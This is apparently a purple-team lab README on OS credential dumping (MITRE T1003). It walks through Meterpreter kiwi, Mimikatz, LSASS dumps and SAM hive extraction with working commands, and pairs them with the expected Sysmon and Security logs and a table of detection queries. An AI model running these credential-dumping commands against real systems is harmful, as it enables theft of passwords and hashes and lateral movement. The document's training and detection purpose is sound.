# 02 - Credential Harvesting (T1003)

## Description

Credential harvesting involves extracting authentication credentials (passwords, hashes, Kerberos tickets) from memory, the file system, or the Windows credential store. The most common technique is dumping the LSASS process memory using tools like Mimikatz.

**MITRE ATT&CK:** [T1003 - OS Credential Dumping](https://attack.mitre.org/techniques/T1003/)

## Sub-techniques Covered

- T1003.001 — LSASS Memory (Mimikatz)
- T1003.002 — Security Account Manager (SAM) hive
- T1003.003 — NTDS (Domain Controller)

## Prerequisites

- Active Meterpreter session on Windows victim (from [01-process-injection](../01-process-injection/README.md))
- Mimikatz binary (or Metasploit Kiwi module)
- SYSTEM-level privileges on the victim

## Steps to Reproduce

### Method A: Metasploit Kiwi Module (Recommended for Lab)

From an existing Meterpreter session:

```
meterpreter > getsystem                   # escalate to SYSTEM
meterpreter > load kiwi                   # load Mimikatz kiwi module
meterpreter > creds_all                   # dump all credentials
meterpreter > lsa_dump_sam                # dump SAM hashes
meterpreter > lsa_dump_secrets            # dump LSA secrets
```

### Method B: Upload and Run Mimikatz Directly

```
meterpreter > upload /opt/mimikatz/x64/mimikatz.exe C:\\Windows\\Temp\\mimi.exe
meterpreter > shell
C:\Windows\Temp\mimi.exe
```

Inside Mimikatz:

```
mimikatz # privilege::debug
mimikatz # sekurlsa::logonpasswords
mimikatz # lsadump::sam
mimikatz # lsadump::dcsync /user:Administrator
```

### Method C: Dump LSASS via Task Manager (without Mimikatz)

On the Windows victim:

1. Open Task Manager → Details tab
2. Right-click `lsass.exe` → Create Dump File
3. Transfer `lsass.DMP` to Kali
4. Parse on Kali:

```bash
pypykatz lsa minidump lsass.DMP
```

### Method D: SAM Registry Hive Extraction

```powershell
# On Windows (admin):
reg save HKLM\SAM C:\Temp\sam.hive
reg save HKLM\SYSTEM C:\Temp\system.hive

# Transfer to Kali, then:
secretsdump.py -sam sam.hive -system system.hive LOCAL
```

## Expected Output (Sample)

```
[*] Credentials found:
Username: Administrator
Domain: VICTIM-PC
NTLM: aad3b435b51404eeaad3b435b51404ee:8846f7eaee8fb117ad06bdd830b7586c
```

## Expected Log Entries

### Sysmon Event ID 10 — ProcessAccess on LSASS

```xml
EventID: 10
SourceImage: C:\Windows\Temp\mimi.exe
TargetImage: C:\Windows\System32\lsass.exe
GrantedAccess: 0x1010
CallTrace: C:\Windows\System32\ntdll.dll|...
```

### Windows Security Event 4624 — Successful Logon (after pass-the-hash)

```
EventID: 4624
LogonType: 3 (Network)
AccountName: Administrator
WorkstationName: KALI-ATTACKER
LogonProcessName: NtLmSsp
```

### Windows Security Event 4661 — Handle to SAM object requested

```
EventID: 4661
ObjectName: \SAM\Domains\Account\Users\000001F4
ProcessName: C:\Windows\Temp\mimi.exe
```

## Detection Opportunities

| Indicator | Log Source | Query |
|-----------|-----------|-------|
| LSASS memory access | Sysmon Event 10 | `EventID=10 TargetImage=*lsass.exe GrantedAccess=0x1010` |
| Mimikatz token | Process creation | `CommandLine=*sekurlsa* OR CommandLine=*privilege::debug*` |
| SAM hive access | Security Event 4661 | `EventID=4661 ObjectName=*\SAM\*` |
| Unusual process accessing LSASS | Sysmon Event 10 | `EventID=10 TargetImage=lsass.exe SourceImage!=*MsMpEng*` |

See [../../detections/splunk-queries/README.md](../../detections/splunk-queries/README.md) for SPL queries.
